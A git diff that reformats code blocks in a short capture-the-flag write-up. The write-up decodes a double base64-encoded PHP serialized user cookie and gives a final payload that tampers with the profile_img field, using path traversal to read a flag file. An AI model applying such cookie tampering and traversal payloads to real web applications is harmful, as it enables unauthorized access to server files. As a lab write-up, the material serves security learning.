@@ -2,11 +2,15 @@
 
 > Solved By : thewhiteh4t
 
-```Port : 20022```
+```
+Port : 20022
+```
 
 - User cookie is double base64 encoded, so we double decoded and ended up with the following :
 
-```O:4:"user":3:{s:8:"username";s:4:"user";s:5:"admin";b:0;s:11:"profile_img";s:23:"/var/www/html/guest.png";}```
+```
+O:4:"user":3:{s:8:"username";s:4:"user";s:5:"admin";b:0;s:11:"profile_img";s:23:"/var/www/html/guest.png";}
+```
 
 ```
 O   -> Object
@@ -23,6 +27,8 @@ b:0 -> False
 - Directly accessing the flag did not work so we can simply use `../`
 - Final payload :
 
-```O:4:"user":3:{s:8:"username";s:4:"user";s:5:"admin";b:0;s:11:"profile_img";s:40:"/var/www/html/../../../../../../flag.png";}```
+```
+O:4:"user":3:{s:8:"username";s:4:"user";s:5:"admin";b:0;s:11:"profile_img";s:40:"/var/www/html/../../../../../../flag.png";}
+```
 
 ![](https://i.imgur.com/JGNO34j.png)
